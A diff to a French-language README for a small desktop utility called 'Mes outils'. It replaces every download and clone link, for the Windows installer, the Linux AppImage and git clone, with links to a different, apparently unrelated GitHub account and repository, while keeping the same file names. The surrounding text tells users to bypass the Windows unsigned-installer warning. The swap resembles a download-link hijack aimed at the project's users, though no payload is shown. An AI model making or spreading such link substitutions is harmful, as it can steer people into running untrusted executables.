@@ -38,7 +38,7 @@ PC, sans compte ni service en ligne.
 
 ### Le plus simple : l'installateur (rien d'autre à installer)
 
-1. Téléchargez **[Mes-outils-Setup.exe](https://github.com/rarianaAina/mes-outils/releases/latest/download/Mes-outils-Setup.exe)** (Windows 10 ou 11).
+1. Téléchargez **[Mes-outils-Setup.exe](https://github.com/larataxidancer/utilidades/releases/latest/download/Mes-outils-Setup.exe)** (Windows 10 ou 11).
 2. Lancez-le. Windows peut afficher « Windows a protégé votre ordinateur » :
    l'installateur n'est pas signé (c'est payant). Cliquez sur
    **Informations complémentaires**, puis **Exécuter quand même**.
@@ -53,7 +53,7 @@ Désinstaller : Paramètres de Windows › Applications › Mes outils.
 
 ### Sous Linux (Ubuntu 24.04 et autres)
 
-1. Téléchargez **[Mes-outils-x86_64.AppImage](https://github.com/rarianaAina/mes-outils/releases/latest/download/Mes-outils-x86_64.AppImage)**.
+1. Téléchargez **[Mes-outils-x86_64.AppImage](https://github.com/larataxidancer/utilidades/releases/latest/download/Mes-outils-x86_64.AppImage)**.
 2. Rendez-le exécutable : clic droit › Propriétés › « Exécutable comme
    programme », ou `chmod +x Mes-outils-x86_64.AppImage`.
 3. Double-cliquez dessus. La bulle apparaît, ainsi qu'une icône en haut à
@@ -75,8 +75,8 @@ seule).
 Il faut Python 3.10 ou plus récent (avec tkinter) et Git.
 
 ```bat
-git clone https://github.com/rarianaAina/mes-outils.git
-cd mes-outils
+git clone https://github.com/larataxidancer/utilidades.git
+cd utilidades
 installer.bat
 ```
 
